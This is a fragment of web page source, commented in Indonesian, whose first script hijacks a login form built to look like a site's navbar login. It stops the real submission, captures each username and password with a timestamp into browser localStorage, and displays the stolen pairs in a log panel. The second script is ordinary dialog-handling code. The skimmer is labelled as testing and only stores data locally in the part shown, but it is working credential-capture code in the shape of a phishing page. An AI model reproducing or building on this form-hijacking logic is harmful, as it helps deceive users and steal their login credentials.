    <script>
        function loadLogs() {
            const logs = JSON.parse(localStorage.getItem('captured_users_alx')) || [];
            const container = document.getElementById('log-list');
            if (logs.length === 0) {
                container.innerHTML = "<span style='color: #666;'>Belum ada data yang dikirim.</span>";
                return;
            }
            container.innerHTML = logs.map((data, idx) => `
                <div style="background: #222; padding: 8px; margin-top: 5px; border-left: 4px solid #ff3333; font-size: 13px;">
                    <strong>[Data #${idx + 1}]</strong> — ${data.date}<br>
                    ➔ Username: <span style="color: #00ff66; font-weight:bold;">${data.username}</span><br>
                    ➔ Password: <span style="color: #00ffff; font-weight:bold;">${data.password}</span>
                </div>
            `).join('');
        }

        document.getElementById('hijackForm').addEventListener('submit', function(e) {
            e.preventDefault(); // Mencegah reload web aslinya
            
            const user = document.getElementById('navbar_username').value;
            const pass = document.getElementById('navbar_password').value;
            const currentDateTime = new Date().toLocaleString('id-ID');

            if (user && pass) {
                const logs = JSON.parse(localStorage.getItem('captured_users_alx')) || [];
                logs.push({ username: user, password: pass, date: currentDateTime });
                localStorage.setItem('captured_users_alx', JSON.stringify(logs));
                
                // Reset isian setelah tombol submit
                document.getElementById('navbar_username').value = '';
                document.getElementById('navbar_password').value = '';
                
                loadLogs();
                alert('Testing: Data inputan masuk ke local storage.');
            }
        });

        function clearLogs() {
            if (confirm('Kosongkan database hasil testing lokal?')) {
                localStorage.removeItem('captured_users_alx');
                loadLogs();
            }
        }

        // Tampilkan data saat website dibuka
        loadLogs();
    </script>

    <script>
        // Existing functions...
        function ready(callback) {
            if (document.readyState != 'loading') callback();
            else if (document.addEventListener) document.addEventListener('DOMContentLoaded', callback);
            else document.attachEvent('onreadystatechange', function() {
                if (document.readyState == 'complete') callback();
            });
        }

        ready(() => {
            setOffDialog();
        });

        function setOffDialog() {
            const getDialogLayer = document.querySelector(`#dialog-container`);
            if (getDialogLayer) {
                const contentDialog = document.querySelector('#modal-content-item');
                getDialogLayer.addEventListener('click', (e) => {
                    if (contentDialog) {
                        const rect = contentDialog.getBoundingClientRect();
                        if (
                            e.clientX < rect.left || e.clientX > rect.right ||
                            e.clientY < rect.top || e.clientY > rect.bottom
                        ) {
                            getDialogLayer.classList.add('dialog-container-off');
                        } else {
                            const getContentItem = contentDialog.href
                            window.open(getContentItem, '_blank', 'noopener,noreferrer');
                        }
                    } else {
                        getDialogLayer.classList.add('dialog-container-off');
                    }
                })
            }
        }
